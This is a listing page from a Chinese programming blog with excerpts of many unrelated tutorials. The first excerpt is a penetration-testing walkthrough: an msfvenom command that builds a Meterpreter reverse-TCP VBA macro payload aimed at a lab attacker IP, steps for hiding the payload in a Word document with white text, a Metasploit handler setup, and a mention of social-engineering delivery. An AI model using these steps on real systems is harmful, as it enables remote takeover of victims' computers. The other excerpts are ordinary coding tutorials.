			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于word文档的客户端渗透 简介 VBA是基于Visual Basic发展而来的，与Visual Basic具有相似的语言结构。使用VBA可以完成很多事情，基于Excel、Word的VBA小程序不计其数。宏病毒在Word中引入宏之后出现的。目前Office 是较为流行的编辑软件，并且跨越了多种操作系统，宏病毒利用这一点得到了大范围的传播。
构造一个包含宏病毒的Word文件也并不复杂，只要编写一个Auto_Open函数，就可自动引发病毒。 在Word打开这个文件时， 宏病毒会执行， 然后感染其他文件或直接删除其他文件等。Word宏和其他样式存储在模版DOT文件中， 因此总是把Word文件转成模版，再将其存储为宏。
环境配置 攻击机： kali：ip 192.168,。139.129
win10 2022版：ip 192.168.5.11
靶机： win10 2015： ip 192.168.139.130
生成payload，设置本地监听 命令：msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.139.129 lport=4444 -a x86 --platform windows -e x86/shikata_ga_nai -i 5 -f vba-exe
分析生成的两个代码 第一个即为个即为payload代码，如下 打开另一台攻击机创建一个word文档 打开word文档设置宏与编辑文档与隐藏 设置宏 一、打开文档点击视图，即可看到宏 二、设置宏名与选择所在的文档 三、将原有的代码删除，复制粘贴我们在kali上获得的宏代码 四、在这里我们不要点击保存而是选择另存为 五、将payload复制粘贴到文档中并隐藏 隐藏：
将字体换成白色即可
打开另一个终端，打开msf进入multi/handler模块 命令：
msfconsole use exploit/multi/handler 查看所需配置文件 配置文件 配置payload
命令：
set payload windows/meterpreter/reverse_tcp 设置用于接受从目标机弹回的shell
开始监听 命令：run
测试 现实中可以利用社会工程学上传，在这里由于靶机没有装WPS我就不演示了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/da3a3db017236ed30802742f02e3edce/" rel="bookmark">
			【深度学习】Faster R-CNN 网络
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Structure 看不清的可以右键，在新tab中查看该图片：
其中，“方框”代表“操作”，“菱框”代表“输出结果”。
以下是我画的Faster R-CNN结构图：
前部 Faster R-CNN 头部 负责对输入图像进行 特征提取 ：
网络结构有两种，一种是将ZFNet（扔掉了尾端的全连接层）拿来用，另一种则是将VGG拿来用（扔掉了尾端的全连接层）。论文中给出的是第一种（绿框内为拿来用的那部分）：
中部 Faster R-CNN 中部 负责对 特征图 (即前部所提取到的特征) 进行 生成anchor并从中筛选出proposal ：
双分支：
绿框内：【RPN（生成anchor --&gt; 洗涤anchor成proposal）】。红框内：【特征图的无损传递】。 最后统一交付给 黄框内：【RoIPooling】 去输出相同size的RoI。
后部 交给 分类任务 和 边框回归任务 来 进一步提升location精度和class精度，并输出检测结果：
Loss Computation 多任务：
Faster R-CNN论文笔记——FR
Fast R-CNN网络有两个同级输出层（cls score和bbox_prdict层），都是全连接层，称为multi-task。
① clsscore层：用于分类，输出k+1维数组p，表示属于k类和背景的概率。对每个RoI（Region of Interesting）输出离散型概率分布
通常，p由k+1类的全连接层利用softmax计算得出。
② bbox_prdict层：用于调整候选区域位置，输出bounding box回归的位移，输出4*K维数组t，表示分别属于k类时，应该平移缩放的参数。
k表示类别的索引，是指相对于objectproposal尺度不变的平移，是指对数空间中相对于objectproposal的高与宽。
loss_cls层评估分类损失函数。由真实分类u对应的概率决定：
loss_bbox评估检测框定位的损失函数。比较真实分类对应的预测平移缩放参数和真实平移缩放参数为
的差别：
其中，smooth L1损失函数为：
smooth L1损失函数曲线如下图9所示，作者这样设置的目的是想让loss对于离群点更加鲁棒，相比于L2损失函数，其对离群点、异常值（outlier）不敏感，可控制梯度的量级使训练时不容易跑飞。
最后总损失为（两者加权和，如果分类为背景则不考虑定位损失）：
规定u=0为背景类（也就是负标签），那么艾弗森括号指数函数[u≥1]表示背景候选区域即负样本不参与回归损失，不需要对候选区域进行回归操作。λ控制分类损失和回归损失的平衡。Fast R-CNN论文中，所有实验λ=1。
艾弗森括号指数函数为：
源码中bbox_loss_weights用于标记每一个bbox是否属于某一个类。
Code 附上作者的源码 rbgirshick/py-faster-rcnn/models/pascal_voc/ZF/faster_rcnn_end2end/train.prototxt ：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/da3a3db017236ed30802742f02e3edce/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8042dab6dc5af6e0cec7cbc34cc9b8e8/" rel="bookmark">
			Thymeleaf介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		翻译：百里香叶;一个现代服务器端 Java 模板引擎。
是什么：服务器渲染技术（jsp也是）。它通常和SpringBoot结合使用。
在线文档：https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html
基本介绍 Thymeleaf是什么?
1.Thymeleaf是一个跟Velocity、FreeMarker类似的模板引擎，可完全替代JSP
2.Thymeleaf,是一个java类库，他是一个xml/xhtml/html5的模板引擎，可以作为mvc的web应用的view层
Thymeleaf的优点
1.实现JSTL、OGNL表达式效果，语法相似，java程序员上手快
2.Thymeleaf模版页面无需服务器渲染，也可以被浏览器运行，页面简洁。
3.SpringBoot支特FreeMarker、Thymeleaf、Velocity
Thymeleaf的缺点
1.Thymeleaf: Thymeleaf is a modern server-side Java template engine for both web and standalone environments
2.缺点：并不是一个高性能的引擎，适用于单体应用
3.说明：如果要做一个高并发的应用，选择前后端分离更好，但是作为SpringBoot推荐的模板引擎，老师还是要讲解Thymeleaf使用，在工作中遇到会使用
4.Vue+ElementPlus+Axios+SpringBoot前后端分离是主流方案。
机制说明 Thymeleaf是服务器渲染技术，页面数据是在服务端进行渲染的
比如：manage.html中一段thymeleaf代码，是在用户请求该页面时，有thymeleaf模板引擎完成处理的（在服务端完成），并将结果页面返回。
因此使用了Thymeleaf,并不是前后端分离（是服务器端渲染技术）。
Thymeleaf语法 表达式
表达式一览
表达式名字
语法
用途
变量取值
${...}
获取请求域、session域、对象等值
选择变量
*{...}
获取上下文对象值
消息
#{...}
获取国际化等值
连接
@{...}
生成连接
片段表达式
~{...}
jsp:include作用，引入公共页面片段
行内写法：[[表达式]] 。在标签外使用表达式，需要这样写才会生效，否则就成了字符串。
字面量
文本值：'hsp edu','hello'
数字：10,7,36.8
布尔值：true,false
空值：nulI
变量：name,age,…变量名不能有空格
文本操作
字符串拼接：+
变量替换：| age=${age} |
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8042dab6dc5af6e0cec7cbc34cc9b8e8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ecc21ffc0dd865e95ab09fad7219b5e0/" rel="bookmark">
			【C语言进阶】最常用的库函数大全——从入门到精通
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言：
一.字符串函数
1.strlen——求字符串长度
strlen
2.长度不受限制的字符串函数
a.strcpy——字符串拷贝
strcpy
b.strcat——追加字符串
strcat
c.strcmp——字符串比较
strcmp
3.长度受限制的字符串函数——strncpy,strncat,strncmp
为什么会出现这些函数呢？
strncpy函数：
strncpy
strncat函数
strncat
strncmp函数：
strncmp
4.字符串查找
a.strstr——判断是否为子字符串
strstr
b.strtok——一个奇怪的函数
strtok
c.strerror——错误信息查找
strerror
perror
上面是字符串相关的函数，下面是一些字符分类的函数：
​编辑 字符转换函数：
二.内存函数
1.内存拷贝函数
a.memcpy
b.memmove
2.内存填充函数——memset
3.内存比较函数——memcmp
总结：
博客主页：张栩睿的博客主页
欢迎关注：点赞+收藏+留言
系列专栏：c语言学习
家人们写博客真的很花时间的，你们的点赞和关注对我真的很重要，希望各位路过的朋友们能多多点赞并关注我，我会随时互关的，欢迎你们的私信提问，也期待你们的转发！
希望大家关注我，你们将会看到更多精彩的内容！！！
前言： C语言中对字符和字符串的处理很是频繁，但是C语言本身是没有字符串类型的，字符串通常放在 常量字符串 中或者 字符数组中。 字符串常量 适用于那些对它不做修改的字符串函数。
以下的函数都需要引用头文件&lt;string.h&gt;
一.字符串函数 1.strlen——求字符串长度 strlen 函数原型：
函数作用：
字符串以'\0'作为结束标志，strlen函数返回值是在字符串中'\0'前面出现的字符个数（不包含'\0'）参数是一个字符指针变量参数指向的字符串必须要以'\0'结束，否则计算出的长度是随机值注意函数的返回值为size_t，是无符号的 函数注意事项：
因为返回值是size_t，所以就要避免出现下图这样的代码：strlen（“abc”）算出的结果是3， strlen("abcde")算出的结果是5，可能想着3-5得到-2，实际上并不是这样的，这里算出的3和5都是无符号整型，算出的-2也是一个无符号整型，-2在内存中以补码的形式存储，从无符号整型的视角看去，这串补码就表示一个很大的正数。
3种模拟的方法：
递归：
递归 int my_strlen1(const char* str) { assert(str !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ecc21ffc0dd865e95ab09fad7219b5e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c92087ace4f1293ba04d210146b0cba0/" rel="bookmark">
			批量拉取/git pull 指定文件夹下面所有 Git 项目的最新代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景 因为工作需要，当前所负责的项目较多；但是人力紧缺，其中绝大部分项目平时也不会去跟进迭代。所以经常需要批量拉取最新的代码查看最新的改动。
解决方案 一键批量拉取指定文件夹下所有 Git 项目的最新代码，批量执行文件下载地址：
https://github.com/mazeyqian/go-gin-gee/releases/tag/v1.1.0
Example 1: MacOS batch-git-pull.sh
#!/bin/bash ./batch-git-pull-mac-darwin-amd64 -path="/Users/X/Web" Output:
2023/01/24 23:01:36 Git pull... 2023/01/24 23:01:36 projectPath: /Users/X/Web 2023/01/24 23:01:36 assignedProjects: . 2023/01/24 23:01:42 result: - - begin - - ... ... - - end - - - - - - - - - - - - - - - - - Example 2: Linux batch-git-pull.sh
#!/bin/bash chmod u+x ./batch-git-pull-linux-amd64 ./batch-git-pull-linux-amd64 -path="/Users/X/Web" -projects="go-gin-gee|mazey" Output:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c92087ace4f1293ba04d210146b0cba0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1e2e6b76fd2a3abaa8b09b77095b55c/" rel="bookmark">
			static void MX_GPIO_Init(void)程序注释
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 请对其作出注释。
static void MX_GPIO_Init(void)
{
GPIO_InitTypeDef GPIO_InitStruct; //定义GPIO结构体变量
__HAL_RCC_GPIOB_CLK_ENABLE(); //总线时钟使能
HAL_GPIO_WritePin(GPIOC, GPIO_PIN_2,GPIO_PIN_RESET) //向PC2引脚输出低电平
GPIO_InitStruct.Pin = GPIO_PIN_2;
GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP; //（GPIO的工作模式为）推挽输出
GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW; //低速输出
HAL_GPIO_Init(GPIOB, &amp;GPIO_InitStruct);}
static void MX_GPIO_Init(void) { GPIO_InitTypeDef GPIO_InitStruct; //定义GPIO结构体变量 __HAL_RCC_GPIOB_CLK_ENABLE(); //总线时钟使能 HAL_GPIO_WritePin(GPIOC, GPIO_PIN_2,GPIO_PIN_RESET) //向PC2引脚输出低电平 GPIO_InitStruct.Pin = GPIO_PIN_2; GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP; //（GPIO的工作模式为）推挽输出 GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW; //低速输出 HAL_GPIO_Init(GPIOB, &amp;GPIO_InitStruct); } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6639479e16daabc948ffad5cd04c3dba/" rel="bookmark">
			在oracle linux下安装 11g
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文介绍在oracle linux5下安装oracle 11g
1、下载Orcle11G
下载地址：www.oracle.com.cn
2、关闭SELINUX
[root@localhost ~]# vi /etc/selinux/config [root@localhost ~]# SELINUX=disabled
[root@localhost ~]# setenforce 0
3、关闭防火墙
[root@localhost ~]# cat /etc/redhat-release
Red Hat Enterprise Linux Server release 5.10 (Tikanga)
[root@localhost ~]# service iptables stop
清除防火墙规则： [确定]
把 chains 设置为 ACCEPT 策略：filter [确定]
正在卸载 Iiptables 模块：service ip [确定]
[root@localhost ~]# service iptables status
防火墙已停
[root@localhost ~]# chkconfig iptables off
[root@localhost ~]# 如果是centenOS7：
[root@myYUn software]# systemctl restart firewalld.service
[root@myYUn software]# systemctl list-unit-files|grep firewalld.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6639479e16daabc948ffad5cd04c3dba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b496f3113276f7b20b7131aaaf5f7d93/" rel="bookmark">
			liunx 无gui 操作浏览器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在 Linux 操作系统中，没有图形界面 (GUI) 的情况下可以使用命令行浏览器，如 Lynx、Links、w3m 等。这些浏览器都可以通过终端进行操作，并且在服务器环境中常常使用。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/20e8aef1268fa4a444b516533948585a/" rel="bookmark">
			python报错UnicodeDecodeError: ‘gbk‘ codec can‘t decode byte，文本乱码解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原因分析：
读取文件时报错Unicode编码错误，一般这种情况较多是在国标码(GBK)和utf8之间选择出现了问题。这个异常报错是由于设置了参数errors默认为严格（strict）造成的，将其更改为ignore等即可。
方法一：在参数中添加上encoding=‘gbk’ 或 encoding=‘utf-8’ ， 以及设置errors参数为errors=‘ignore’
经测试发现笔者这里两种编码格式输出的文本内容均是乱码，证明我们要打开的文本不是gbk或utf-8编码格式。
方法二：用笔记本打开另存为utf-8格式
方法三：使用docx库（推荐）
安装docx库：pip install python-docx
使用docx方法打开：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/32ba90123f44f07f02ed50c77f71c58b/" rel="bookmark">
			commons-math3 简介、中文文档、中英对照文档 下载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		commons-math3 文档 下载链接（含jar包、源码、pom） 组件名称中英对照-文档-下载链接中文-文档-下载链接commons-math3-3.6.1.jarcommons-math3-3.6.1-API文档-中英对照版.zipcommons-math3-3.6.1-API文档-中文版.zipcommons-math3-3.5.jarcommons-math3-3.5-API文档-中英对照版.zipcommons-math3-3.5-API文档-中文版.zipcommons-math3-3.4.1.jarcommons-math3-3.4.1-API文档-中英对照版.zipcommons-math3-3.4.1-API文档-中文版.zipcommons-math3-3.1.1.jarcommons-math3-3.1.1-API文档-中英对照版.zip暂无 commons-math3 简介 Apache通用数学
Apache Commons Math项目是一个轻量级、自包含的数学和统计组件库，用于解决Java编程语言或Commons -lang中无法立即提供的最常见的实际问题。
commons-math3 中文文档、中英对照文档 说明 摘要：commons-math3、org.apache.commons.math3、中文文档、中英对照文档、下载、包含jar包、原API文档、源代码、Maven依赖信息文件、翻译后的API文档、apache、commons、math3、中文文档、jar包、java；
使用方法：解压翻译后的API文档，用浏览器打开“index.html”文件，即可纵览文档内容。
人性化翻译，文档中的代码和结构保持不变，注释和说明精准翻译，请放心使用。
中英对照版样例 中文版样例 涉及的包（package） org.apache.commons.math3
org.apache.commons.math3.analysis
org.apache.commons.math3.analysis.differentiation
org.apache.commons.math3.analysis.function
org.apache.commons.math3.analysis.integration
org.apache.commons.math3.analysis.integration.gauss
org.apache.commons.math3.analysis.interpolation
org.apache.commons.math3.analysis.polynomials
org.apache.commons.math3.analysis.solvers
org.apache.commons.math3.complex
org.apache.commons.math3.dfp
org.apache.commons.math3.distribution
org.apache.commons.math3.distribution.fitting
org.apache.commons.math3.exception
org.apache.commons.math3.exception.util
org.apache.commons.math3.filter
org.apache.commons.math3.fitting
org.apache.commons.math3.fitting.leastsquares
org.apache.commons.math3.fraction
org.apache.commons.math3.genetics
org.apache.commons.math3.geometry
org.apache.commons.math3.geometry.enclosing
org.apache.commons.math3.geometry.euclidean.oned
org.apache.commons.math3.geometry.euclidean.threed
org.apache.commons.math3.geometry.euclidean.twod
org.apache.commons.math3.geometry.euclidean.twod.hull
org.apache.commons.math3.geometry.hull
org.apache.commons.math3.geometry.partitioning
org.apache.commons.math3.geometry.partitioning.utilities
org.apache.commons.math3.geometry.spherical.oned
org.apache.commons.math3.geometry.spherical.twod
org.apache.commons.math3.linear
org.apache.commons.math3.ml
org.apache.commons.math3.ml.clustering
org.apache.commons.math3.ml.clustering.evaluation
org.apache.commons.math3.ml.distance
org.apache.commons.math3.ml.neuralnet
org.apache.commons.math3.ml.neuralnet.oned
org.apache.commons.math3.ml.neuralnet.sofm
org.apache.commons.math3.ml.neuralnet.sofm.util
org.apache.commons.math3.ml.neuralnet.twod
org.apache.commons.math3.ml.neuralnet.twod.util
org.apache.commons.math3.ode
org.apache.commons.math3.ode.events
org.apache.commons.math3.ode.nonstiff
org.apache.commons.math3.ode.sampling
org.apache.commons.math3.optim
org.apache.commons.math3.optim.linear
org.apache.commons.math3.optim.nonlinear.scalar
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/32ba90123f44f07f02ed50c77f71c58b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f08a2c48dd42cbc6b55dba000b9ae042/" rel="bookmark">
			信息论复习—信源编码的基本方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
信源编码的目的：提高传输效率 离散信源：
离散信源的分类：
离散无记忆信源 (DMS: Discrete Memoryless Source）：
离散无记忆信源的特点：
离散无记忆信源编码与译码：
等长编码的编码速率：
不等长编码的编码速率：
信源的熵H(S )，与编码速率 R 的比值定义为编码效率
离散无记忆信源的等长编码：
等长编码：对信源的每个符号，或每组符号，用长度相等的代码来表示：
扩展编码(联合编码)：将 J 个信源符号进行联合编码：
离散无记忆信源(DMS)的有损等长编码：
定义：典型序列集
信源划分定理：
可达速率：
离散无记忆信源的不等长编码：
不等长编码的唯一可译性：
逗点码 —见到逗号就识别为一个码字的开始：
异字头码 — 见到一个码字就立即识别：
码树：
异字头码（编码）：
不等长编码的基本定理：
​例：
霍夫曼(Huffman)编码：
霍夫曼编码的步骤：
例：
​编辑​编辑 码字长度的均匀性和方差：
信源编码的目的：提高传输效率 （1）去除消息中的冗余度，使传输的符号尽可能都是独立的，没有多余的成分(如语音、图像信号压缩)；
（2）使传输的符号所含的信息最大化。例如，通过编码使符号以等概分布的形式出现，使每个符号可能携带的信息量达到最大；
（3）采用不等长编码，让出现概率大的符号用较短的码元序列表示，对概率小的符号用较长的码元序列；
(4) 在允许一定失真的条件下，如何实现高效率的编码。
离散信源： 离散无记忆信源：
所发出的各个符号之间是相互独立的，发出的符号序列中的各个符号之间没有统计关联性，各个符号的出现概率是它自身的先验概率。
离散有记忆信源：
发出的各个符号之间不是相互独立的，各个符号出现的概率是有关联的。
发出单个符号的离散信源：
信源每次只发出一个符号代表一个消息；
发出符号序列的离散信源：
信源每次发出一组含两个以上符号的符号序列代表一个消息。
将以上两种分类结合，就有四种离散信源：
（1）发出单个符号的无记忆离散信源；
（2）发出符号序列的无记忆离散信源；
（3）发出单个符号的有记忆离散信源；
（4）发出符号序列的有记忆离散信源。
离散信源的分类： 单个符号的离散信源：每次只发出一个符号代表一个消息，且消息数量有限
发出符号序列离散信源－－每次发出一组含两个以上的符号序列来代表一个消息
实例：
离散无记忆信源 (DMS: Discrete Memoryless Source）： 离散无记忆信源的特点： ①信源发出的各符号之间相互独立；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f08a2c48dd42cbc6b55dba000b9ae042/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3f8c39b286a3663b0aa16e1d841891cf/" rel="bookmark">
			什么是库？库的开发与使用（C/C&#43;&#43;）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是库（library）？ 库这个概念，阿宋觉得对于初学者来说会比较陌生。所以我们先范范的讲一下这个东西是干什么的，接下来再将一下，其中有什么区别。
所谓程序库，一般来说就是软件作者为了实现发布方便或替换方便又或者是二次发布方便这个目的，所制作的一组可以单独与应用程序进行静态链接或动态链接的二进制可重定位目标码文件。
说到底，一个库就是一个文件而已。这个库（文件）可以是在编译时由编译器直接链接到可执行程序之中，也可以在运行时根据操作系统的运行环境按需要动态加载到内存之中。
再简单点，我们可以认为库（文件）就是一个代码仓库，里面有一些我们可以直接拿来用的变量，函数或者类。
库文件的类型只有两种，分别是静态库与动态库（共享库）。它们之间的区别是：静态库的代码在程序的链接阶段就已经复制到程序之中了。而动态库的代码没有在链接阶段复制到程序当中，而是程序在运行时由系统动态加载到内存中，供程序调用。
从上文中，我们就可以得到使用库的第一个好处，方便程序的部署与开发。
在Linux的平台下，静态库文件的后缀是 .a ,动态库的后缀是 .so 。
在window的平台下，静态库文件的后缀是 .lib ，动态库的后缀是.dll。
静态库的制作与使用 首先我们先讲一下命名规则：
在Linux平台下，前缀lib是固定的，后面紧跟库的名字（这里用xxx代替），最后以.a后缀为结尾。总体一个静态库的文件名长这样：libxxx.a
在Linux平台制作方法如下：
首先通过gcc/g++获得c或c++的 .o文件(还未被链接的机器代码）。紧接着使用ar命令（archive）将这些 .o文件进行打包。
具体命令的格式如下：
ar rcs libxxx.a xxx.o xxx.o //命令ar 参数rcs 库的名字 需要进行打包的文件名
参数r：将文件插入备存文件当中
参数c：建立备存文件
参数s：索引
编程演示：静态库的制作 阿宋这里的目的是生成一个简单进行加减乘除运算的静态库。并且使用这个静态库中自己定义的函数，然后去完成加减乘除的运算。
制作静态库前的准备：
为了更好的去展示将函数打包成一个静态库。阿宋将主函数单独放在一个文件下，所有加减乘除的函数声明放在一个文件下，4个函数分别放在4个文件夹下。具体的代码如下所示，每一个代码块单独是一个文件。
add.c
#include &lt;stdio.h&gt; #include "head.h" int add(int a, int b) { return a+b; } sub.c
#include &lt;stdio.h&gt; #include "head.h" int sub(int a, int b) { return a-b; } mult.c
#include &lt;stdio.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3f8c39b286a3663b0aa16e1d841891cf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a4bb9cdb4c82de24bb745670565ce9c/" rel="bookmark">
			uboot常用命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在 uboot 命令模式下
用命令 mmc list 列出当前的 MMC 设备 比如看SD 卡和 EMMC 驱动是否正常
输入下面代码
mmc list 用命令mmc dev切换当前 MMC 设备 检查每个 MMC 设备信息，先检查 MMC 设备 0，输入如下命令：
mmc dev 0 切换到sd后，输入下面命令查看信息
mmc info mmc 设备 0 是 SD 卡， SD 卡容量为 14.8GB
这个和我所使用的SD 卡信息相符，说明 SD 卡驱动正常。
再来检查 MMC 设备 1，输入如下命令：
mmc dev 1 切换到emmc后，输入下面命令查看信息：
mmc info mmc 设备 1 为 EMMC，容量为 7.3GB，说明 EMMC 驱动也正常
用命令mmc info输出 MMC 设备信息 这使用 MMC 来代指 EMMC 和 SD 卡，uboot 中常用于操作 MMC 设备的命令为“mmc”
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7a4bb9cdb4c82de24bb745670565ce9c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a540030c649c8114aa62d5d12c91128/" rel="bookmark">
			第十周：结构体 &#43; 指针 &#43; 单链表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1.统计候选人得票题目：代码： 2.结构体数组的排序题目：代码： 3.单链表的创建题目：代码： 4.链表的插入排序题目：代码： 5.两个链表的合并题目：代码： 1.统计候选人得票 题目： 编程统计候选人的得票数。设计有3个候选人zhang，li，wang，且不区分大小写，10个选民，选民每次输入一个得票的候选人的名字，若选民输错候选人选民，则按废票处理。选民投票结束后程序自动显示各候选人的得票结果和废票信息。要求用结构体数组candidate表示3个候选人的姓名和得票结果。
【样例输入】
zhang
li
wang
Wang
Li
Zhang
zhang
ZHANG
deng
Deng
【样例输出】
zhang 4
li 2
wang 2
Error 2
代码： #include &lt;iostream&gt; #include &lt;string.h&gt; using namespace std; struct candidate { char name[10]; int dp; }CANDIDATE[4]; int main() { char xm[20]; strcpy(CANDIDATE[0].name,"ZHANG"); strcpy(CANDIDATE[1].name,"LI"); strcpy(CANDIDATE[2].name,"WANG"); strcpy(CANDIDATE[3].name,"Error"); CANDIDATE[0].dp = 0; CANDIDATE[1].dp = 0; CANDIDATE[2].dp = 0; CANDIDATE[3].dp = 0; while (cin &gt;&gt; xm){ int len = strlen(xm); for(int i = 0; i &lt; len; i ++) { if(xm[i] &gt;= 'a' &amp;&amp; xm[i] &lt;= 'z') { xm[i] -= 32; } } bool flag = true; for(int j = 0; j &lt; 3; j ++) { if(strcmp(CANDIDATE[j].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3a540030c649c8114aa62d5d12c91128/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a7772d6fa6fe8b9cf6fcf81284cb7e7/" rel="bookmark">
			【开发细节】用C语言基础写学生管理系统（三）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前情回顾 自定义preconf.h头文件。作用：被核心头文件所包含，从而调用相关已定义的数据定义Boolean、Status两种返回值类型，本质上是int类型定义SqList、ElemType了两个结构体，实则属于独立结构的Struct嵌套定义并初始化SysConfig结构体 一、本次目标 根据学生管理系统的功能特性与线性表的ADT描述，确定并编写相关的基本操作，便于后续的文件调用。
GitHub：https://github.com/ITchujian/StudentManagementSystem_2022_C
注：为方便分享本次开发的经历，我把分析过程以及代码书写过程，以文字、图片形式合计放于开发记录中，但是一些非常基础的行为动作我将不会讲解或者阐述。
当前位置：【开发细节】用C语言基础写学生管理系统（三）
可跳转：
【开发细节】用C语言基础写学生管理系统（一）【开发细节】用C语言基础写学生管理系统（二）【开发细节】用C语言基础写学生管理系统（三）【开发细节】用C语言基础写学生管理系统（四）【开发细节】用C语言基础写学生管理系统（五）【开发细节】用C语言基础写学生管理系统（六）【开发细节】用C语言基础写学生管理系统（七） 二、开发记录 步骤1 ADT——Abstract Data Type，意为抽象数据类型，我的理解：
描述数据结构的数学模型，以及该模型所能做出的操作
请注意，我们所使用的是线性表的顺序存储结构，而非链式结构，这一点已经在1.1文章的代码中有所体现。
因此，对于学生管理系统的线性表ADT如下：
数据对象：D={学生1，学生2，……，学生n}，n&gt;=0数据关系：R={相邻学生之间存在先后关系}基本操作表： 序号函数名操作结果1InitList初始化，构造空的线性表2DestroyList销毁线性表3ClearList清空线性表4ListEmpty判断空的线性表5ListLength返回线性表长度6GetElem获取线性表的数据元素7LocateElem返回满足一定条件的数据元素的位序8SearchElem通过数据项搜索线性表9ListInsert向线性表插入元素10ListDelete向线性表删除元素11ListTraverse遍历线性表的数据元素，执行同类型操作12SwapElem交换两个数据元素的位置13ListSort排序整个线性表以上表格中，绝大部分的操作我们都将可能用到，拭目以待吧。 步骤2 创建kernel_list.h（代表这是一个与表相关的核心文件，后续的其他文件都需要调用该头文件中的操作）
此时VS2022已经给我们的头文件顶行加上了如下代码：
#pragma once 看来微软官方的IDE也比较推荐我们使用这种😂
步骤3 引入自定义的头文件preconf.h。
#include "preconf.h" 步骤4 这一步，我们将实现基本操作表中的所有操作，函数的命名和表中呈现一样，使用大驼峰命名法（根据开发规范，此为核心文件，函数命名即为如此）。
初始化，构造空的线性表
通过malloc函数申请一片内存，然后判断内存是否分配成功；
赋予SqList结构体中的length初始值0，即现在0个学生；
初始分配空间值为128，单位为sizeof(ElemType)。
Status InitList(SqList* L) { L-&gt;elem = (ElemType*)malloc(LIST_INIT_SIZE * sizeof(ElemType)); if (!(L-&gt;elem)) exit(OVERFLOWED); L-&gt;length = 0; L-&gt;list_size = LIST_INIT_SIZE; return OK; } 销毁线性表
释放动态内存；
长度为0；
分配空间也为0；
Status DestroyList(SqList* L) { free(L-&gt;elem); L-&gt;elem = NULL; L-&gt;length = 0; L-&gt;list_size = 0; return OK; } 清空线性表
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6a7772d6fa6fe8b9cf6fcf81284cb7e7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/49bc54ffad957f9f81eb62c440a1822b/" rel="bookmark">
			input 实现回车失焦，考虑输入法的情况
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有一个需求，就是我们在 input 输入内容后，按下回车键，能够让 input 失去焦点，此外也可以触发一些业务逻辑，比如保存数据到服务器。
我们事件对象判断是否按下了 Enter（event.key === 'Enter'），如果按下，调用 input.blur()。
通常认为用户输入法输入内容然后回车，是因为错误使用了输入法，回车后可以将内容输入到 input 中，但还是 Work In Process（半成品）状态，不希望触发失焦逻辑，希望用户可以继续编辑。
